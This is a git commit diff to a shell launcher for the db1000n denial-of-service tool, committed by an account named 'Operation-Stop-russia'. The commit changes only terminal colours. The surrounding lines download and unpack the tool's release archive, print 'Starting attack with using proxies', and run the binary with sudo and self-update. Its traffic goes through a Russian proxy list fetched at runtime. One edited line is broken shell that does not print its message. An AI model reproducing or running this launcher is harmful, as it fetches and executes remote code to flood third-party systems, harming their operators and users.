98aa1cd723ca6f9618757dfb80a49e201d37ae1d
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-04-25 10:58:00 +0300

    Update db1000n_proxy.sh

--- db1000n_proxy.sh
+++ db1000n_proxy.sh
@@ -12,7 +12,7 @@ CHECKSUM_DOWNLOAD_URL=$(curl -s "https://api.github.com/repos/${REPO}/releases/l
 ARCHIVE=${BROWSER_DOWNLOAD_URL##*/}
 CHECKSUMS_FILE=${CHECKSUM_DOWNLOAD_URL##*/}
 
-tput setaf 2; echo "Downloading an archive..."
+tput bold; tput setaf 2; echo "Downloading an archive..."
 echo "${BROWSER_DOWNLOAD_URL}" | xargs -n 1 curl -s -L -O
 echo "Downloading checksums..."
 echo "${CHECKSUM_DOWNLOAD_URL}" | xargs -n 1 curl -s -L -O
@@ -33,8 +33,8 @@ else
 fi
 
 tar xvf "${ARCHIVE}"
-echo "db1000n successfully installed"
+tput setab 3 echo "db1000n successfully installed"
 sleep 1
-echo "Starting attack with using proxies"; tput setaf 3; tput setab 4
+echo "Starting attack with using proxies"; tput setaf 4; tput setab 3
 sleep 5
 sudo ./db1000n -proxy '{{ join (split (get_url "https://raw.githubusercontent.com/OleksandrBlack/proxy-scraper-checker/main/proxies/proxies_ru.txt") "\n") "," }}' -enable-self-update -restart-on-update=false
